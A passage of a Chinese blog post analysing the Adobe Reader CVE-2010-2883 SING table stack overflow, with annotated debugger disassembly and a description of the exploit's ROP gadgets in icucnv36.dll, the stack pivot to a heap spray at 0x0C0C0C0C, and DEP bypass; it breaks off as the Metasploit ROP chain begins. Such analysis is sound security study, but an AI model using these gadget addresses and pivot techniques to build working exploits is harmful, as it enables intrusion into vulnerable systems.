<p>&emsp;&emsp;通过上面的分析,我们可以知道,<code>样本</code>构造的<code>SING表</code>的<code>“uniqueName”字段</code>将栈上<code>对象(0x0012E6B0)</code>的一个<code>函数指针</code>类型的<code>成员变量(0x0012E6D0)</code>覆盖为了<code>ROPgadget(0x4A80CB38)</code>的地址。而触发点为<code>StreamHandler类</code>的<code>虚函数sub_808B116()</code>中地址<code>0x0808B308</code>处的调用指令<code>call dword ptr [eax]</code>,这条调用指令将<code>对象(0x0012E6B0)</code>中的<code>函数指针(0x0012E6D0)的值</code>作为调用地址,从而获得程序执行流的劫持。这个<code>函数指针的地址</code>又存储在<code>对象(0x0012E718)</code>中的一个<code>指针类型</code>的<code>成员变量(0x0012E754)</code>中。<code>虚函数sub_808B116()</code>通过传入的<code>参数对象(0x0012E718)</code>的指针,找到<code>对象(0x0012E6B0)</code>中的<code>函数指针(0x0012E6D0)</code>,进行函数调用,从而获得程序执行流的劫持。<br>&emsp;&emsp;所以,<code>metasploit</code>中的漏洞利用脚本,并不是通过覆盖<code>虚函数的指针</code>或<code>虚表指针</code>,以及<code>SEH结构</code>来控制程序执行流的。</p>
<h5 id="2-5、样本中SING表数据“0x4A8A08C6”的作用"><a href="#2-5、样本中SING表数据“0x4A8A08C6”的作用" class="headerlink" title="2.5、样本中SING表数据“0x4A8A08C6”的作用"></a>2.5、样本中SING表数据“0x4A8A08C6”的作用</h5><p>&emsp;&emsp;<code>0x4A8A08C6</code>是一个<code>地址值</code>,<code>0x4A8A08C6+0x1C=0x4A8A08E2</code>应具有<code>可读可写</code>权限。因为,在通过<code>strcat()</code>将<code>SING表数据</code>复制到<code>栈</code>上之后,以及获得<code>程序执行流</code>的劫持之前,会对<code>此地址</code>进行<code>读写</code>,所以构造的样本中<code>此处的地址+0x1C</code>必须具有<code>可读可写</code>权限,否则会<code>触发异常</code>,通过<code>SEH链</code>进入异常处理,就无法获得程序执行流的劫持。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">******************************************************</span><br><span class="line"></span><br><span class="line">                sub_814B423()</span><br><span class="line"></span><br><span class="line">******************************************************</span><br><span class="line"><span class="symbol">.text:</span>0814B470        <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+var_4], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0814B474        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]</span><br><span class="line"><span class="symbol">.text:</span>0814B477        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]</span><br><span class="line"><span class="symbol">.text:</span>0814B47A        <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0814B47B        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>0814B47E        <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0814B47F        <span class="keyword">call</span>    sub_80DD0B3  &lt;-------</span><br><span class="line"><span class="symbol">.text:</span>0814B484        <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">18h</span></span><br><span class="line"><span class="symbol">.text:</span>0814B487        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+var_20]</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*************************************************************************************</span><br><span class="line"></span><br><span class="line">     <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>080DD0B3        <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">; [0x0012E7E8]=ebp=0x0012E838,父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0B4        <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0CCh</span>                        <span class="comment">; esp=0x0012E71C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BA        <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                     <span class="comment">; ebp=0x0012E718,本函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BE        <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie          <span class="comment">; eax=0x78FC1194</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C3        <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78EEF68C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C5        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_4], <span class="built_in">eax</span>            <span class="comment">; [ebp+0xcc] = [0x0012E7E4] = 0x78EEF68C,父函数ebp之上</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0CB        <span class="keyword">push</span>    <span class="number">104h</span>                             <span class="comment">; [esp-0x4]=[0x0012E718]=0x104,(__EH_prolog3中分配的栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D0        <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8182A36          <span class="comment">; eax=0x8182A36(__security_check_cookie函数地址)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D5        <span class="keyword">call</span>    __EH_prolog3                     <span class="comment">; [0x0012E714]=ret=0x080DD0DA</span></span><br><span class="line">........</span><br><span class="line"><span class="symbol">.text:</span>080DD2D1 loc_80DD2D1:                          </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1                              </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1        <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]</span><br><span class="line"><span class="symbol">.text:</span>080DD2D7        <span class="keyword">call</span>    sub_80172FB</span><br><span class="line"><span class="symbol">.text:</span>080DD2DC        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8], <span class="built_in">ebx</span>            <span class="comment">;   [ebp-0x18]=[0x0012E700]=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2DF        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8]            <span class="comment">;   eax=ebp-0x18=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E2        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_4: [0x0012E5F4]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E3        <span class="keyword">push</span>    <span class="built_in">ebx</span>                               <span class="comment">; arg_3: [0x0012E5F0]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E4        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]           <span class="comment">;   eax=ebp-0x110=0x0012E718-0x110=0x0012E608</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EA        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_2: [0x0012E5EC]=eax=0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EB        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+value1_823A850]    <span class="comment">;   eax=ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EE        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_1: [0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EF        <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_D4], <span class="number">4</span>     <span class="comment">; [ebp-0x4]=[0x0012E714]=4</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2F3        <span class="keyword">call</span>    sub_803DCF9      &lt;-------</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">*******************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9         <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                    <span class="comment">; esp=0x0012E4DC,分配局部变量栈空间</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00         <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                 <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04         <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie      <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09         <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                     <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>        <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11         <span class="keyword">push</span>    <span class="number">4Ch</span>                          <span class="comment">; [0x0012E4D8]=0x4C(分配栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13         <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54      <span class="comment">; eax=0x8184A54(__security_check_cookie)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18         <span class="keyword">call</span>    __EH_prolog3_catch           <span class="comment">; [0x0012E4D4]=0x0803DD1D,ret</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DD29         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]        <span class="comment">; ebx = 0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                </span><br><span class="line"><span class="symbol">.text:</span>0803DD9F         <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                         <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf]   <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>     <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB         <span class="keyword">call</span>    strcat                           <span class="comment">; 调用strcat函数，造成溢出</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB0         <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB1         <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB2         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf]   <span class="comment">;   eax=ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB5         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: [0x0012E46C]=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB6         <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">ebx</span>                         <span class="comment">; this: ecx=ebx=0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB8         <span class="keyword">call</span>    sub_8001243</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *__thiscall sub_8001243(<span class="keyword">int</span> *this, <span class="keyword">int</span> uniqueName_buf)</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001243</span>         <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">; esi=0x0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001244</span>         <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; edi=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001245</span>         <span class="keyword">push</span>    [<span class="built_in">esp</span>+<span class="number">8</span>+uniqueName_buf]           <span class="comment">; [esp+0xc]=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001249</span>         <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>                         <span class="comment">; esi = ecx = 0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>0800124B         <span class="keyword">call</span>    dword_8231220                    <span class="comment">; BIB.07005C59</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001251</span>         <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                         <span class="comment">; edi=eax=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001253</span>         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]                       <span class="comment">; eax = [esi]=[0x0012E608]=0x4A8A08C6,icucnv36 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001255</span>         <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001257</span>         <span class="keyword">pop</span>     <span class="built_in">ecx</span>                              <span class="comment">; ecx=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001258</span>         <span class="keyword">jz</span>      short loc_8001262                <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0800125A         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: [0x0012E45C]=eax = 0x4A8A08C6, &lt;----------</span></span><br><span class="line"><span class="symbol">.text:</span>0800125B         <span class="keyword">call</span>    dword_8231224                    <span class="comment">; BIB.07005CAF  </span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">07005CAF       <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0x4</span>]           <span class="comment">; ecx=[esp+4]=0x4A8A08C6 &lt;- arg1</span></span><br><span class="line">07005CB3       <span class="keyword">jmp</span> BIB.070013F2</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">**********************************************</span><br><span class="line"></span><br><span class="line">            BIB.070013F2()</span><br><span class="line"></span><br><span class="line">**********************************************</span><br><span class="line">070013F2       <span class="keyword">push</span> <span class="built_in">ebp</span>                                 <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line">070013F3       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span>                              <span class="comment">; ebp=esp=0x0012E454</span></span><br><span class="line">070013F5       <span class="keyword">push</span> <span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x4A8A08C6,icucnv36</span></span><br><span class="line">070013F6       <span class="keyword">push</span> <span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x4A8A08C6,icucnv36</span></span><br><span class="line">070013F7       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x1C</span>]          <span class="comment">; eax=0x4A8A08C6+0x1C=0x4A8A08E2 &lt;--------</span></span><br><span class="line">070013FA       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="built_in">eax</span>           <span class="comment">; </span></span><br><span class="line">070013FD       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>]           <span class="comment">; </span></span><br><span class="line"><span class="number">07001400</span>       <span class="keyword">lock</span> <span class="keyword">dec</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              <span class="comment">; [eax] = [0x4A8A08E2] = 0x00000000,减1变为0xFFFFFFFF &lt;--------</span></span><br><span class="line"><span class="number">07001403</span>       <span class="keyword">sete</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1</span>]               <span class="comment">; 取标志寄存器中ZF的值, 赋值给[ebp-0x1] ebp=0012E454;[0012E450]=0x4A8A08C6-&gt;0x008A08C6</span></span><br><span class="line"><span class="number">07001407</span>       <span class="keyword">cmp</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1</span>],<span class="number">0x0</span>            <span class="comment">; ZF=1</span></span><br><span class="line">0700140B       <span class="keyword">je</span> short BIB<span class="meta">.07001412</span>                    <span class="comment">; 跳转实现</span></span><br><span class="line"><span class="number">0700140D</span>       <span class="keyword">call</span> BIB.070013B5                        <span class="comment">; 不执行</span></span><br><span class="line"><span class="number">07001412</span>       <span class="keyword">leave</span></span><br><span class="line"><span class="number">07001413</span>       <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;通过上面的调试信息,<code>BIB.070013F2()</code>函数中的地址<code>0x07001400</code>处的指令<code>lock dec dword ptr ds:[eax]</code>对<code>0x4A8A08C6+0x1C=0x4A8A08E2</code>地址处的值进行了<code>读写</code>,所以<code>0x4A8A08C6+0x1C</code>处的值必须要具有<code>可读可写</code>权限。在<code>吾爱OllyDbg</code>的内存窗口,只能看到此地址具有<code>读权限</code>,而通过<code>Immunity Debugger</code>可以看到此地址处具有<code>读写权限</code>。</p>
<h5 id="2-6、样本中SING表数据“0x6C”的作用"><a href="#2-6、样本中SING表数据“0x6C”的作用" class="headerlink" title="2.6、样本中SING表数据“0x6C”的作用"></a>2.6、样本中SING表数据“0x6C”的作用</h5><p>TBD,样本中注释说是,如果没有这段数据,sub_801ba57()函数将会返回0。没有调试出来。<br>最近找到一个链接，提到了这个数据的作用，更新下，就先不分析了，没啥时间。<br><a href="https://web.archive.org/web/20120303021728/http://www.vupen.com/blog/20100909.Adobe_Acrobat_Reader_0_Day_Exploit_CVE-2010-2883_Technical_Analysis.php" target="_blank" rel="noopener">2010.09.09 - VUPEN - Criminals Are Getting Smarter: Analysis of the Adobe Acrobat/Reader 0-Day Exploit</a></p>
<h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><h3 id="0x41-ROP绕过DEP"><a href="#0x41-ROP绕过DEP" class="headerlink" title="0x41 ROP绕过DEP"></a>0x41 ROP绕过DEP</h3><h4 id="1、阶段1：跳转到堆喷代码"><a href="#1、阶段1：跳转到堆喷代码" class="headerlink" title="1、阶段1：跳转到堆喷代码"></a>1、阶段1：跳转到堆喷代码</h4><p>&emsp;&emsp;<code>DEP</code>(Data Execution Prevention),即<code>数据执行保护</code>。开启后,<code>堆栈</code>是不具有<code>执行权限</code>的,所以不能直接在<code>缓冲区</code>中填入<code>Payload</code>。而<code>ROP</code>(Return-Oriented Programming),<code>返回导向编程</code>,则是通过程序中<code>已存在</code>的多段小的<code>代码片段(ROPgadget)</code>来控制程序执行流的。缓冲区中填入的只是<code>代码片段的首地址</code>。样本中使用了<code>两段ROPgadget</code>代码片段用于<code>绕过DEP</code>。<br><strong><code>ROPgadget1:</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">icucnv36.4A80CB38    81C5 <span class="number">94070000</span>   <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x794</span> <span class="comment">; ebp=0x0012DD48+0x794=0x0012E4DC</span></span><br><span class="line">icucnv36.4A80CB3E    C9              <span class="keyword">leave</span>         <span class="comment">; 如下</span></span><br><span class="line">icucnv36.4A80CB3F    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">leave:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span> <span class="comment">; esp=ebp=0x0012E4DC</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebp</span>     <span class="comment">; esp=esp+0x4=0x0012E4E0 -&gt; ROPgadget2</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;执行到<code>0x0012E6D0</code>处的<code>ROPgadget1</code>时,<code>esp</code>(0x0012DD24)距离我们构造的<code>“uniqueName”字段</code>在栈上的<code>缓冲区的首地址</code>(0x0012E4D8)有<code>较远距离</code>,所以我们需要寻找一段可以调整<code>esp</code>至“uniqueName”字段缓冲区内的<code>ROPgadget</code>。上面这段<code>ROPgadget</code>先是通过修改<code>ebp</code>,让其落在“uniqueName”字段缓冲区内,然后通过<code>leave</code>指令,利用<code>ebp</code>来修改<code>esp</code>,使其指向<code>第二段ROPgadget</code>,再执行<code>ret</code>指令,跳转到<code>ROPgadget2</code>执行。</p>
<p><strong><code>ROPgadget2:</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">icucnv36.4A82A712    FF50 5C         <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x5C</span>]</span><br><span class="line">icucnv36.4A82A715    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line">icucnv36.4A82A714    5C              <span class="keyword">pop</span> <span class="built_in">esp</span> <span class="comment">; esp=0x0C0C0C0C                       </span></span><br><span class="line">icucnv36.4A82A715    C3              <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这段<code>ROPgadget</code>直接将<code>esp</code>指向<code>堆喷的ROP Chain</code>代码处,执行<code>ROP Chain</code>。原本这里的代码是<code>CALL</code>指令，机器码为<code>FF50 5C</code>,这里只截取了<code>5C</code>，所以指令变成了<code>pop esp</code>,成功控制EIP去执行<code>Heap Spray</code>处的<code>ROP Chain</code>。</p>
<p>接下来我们通过一张图来了解这个<code>ROP过程</code>：</p>
<div align="left"><img src="/resources/2018/2018-06-01-03.png" width="80%" height="70%" alt="漏洞利用ROP链"></div>

<p>&emsp;&emsp;前面说过,漏洞作者选取的这两个ROPgadget地址<code>0x4A82A714</code>和<code>0x4A80CB38</code>都位于<code>icucnv36.dll</code>的地址空间，而在<code>Adobe Reader</code>的各个版本上，这个dll的这两处地址是<code>始终不变</code>的，从而保证了<code>exploit</code>对于各版本的<code>兼容性</code>和<code>稳定性</code>。</p>
<h4 id="2、阶段2：将真正的shellcode复制到可读可写可执行内存段"><a href="#2、阶段2：将真正的shellcode复制到可读可写可执行内存段" class="headerlink" title="2、阶段2：将真正的shellcode复制到可读可写可执行内存段"></a>2、阶段2：将真正的shellcode复制到可读可写可执行内存段</h4><p>&emsp;&emsp;接下来我们来看看<code>堆喷的代码</code>是怎样<code>绕过DEP</code>的。我查看了<code>msf</code>用于<code>生成样本文件的模块</code>，其中如下的数据就是用于<code>绕过DEP</code>而构造的<code>ROP Chain</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 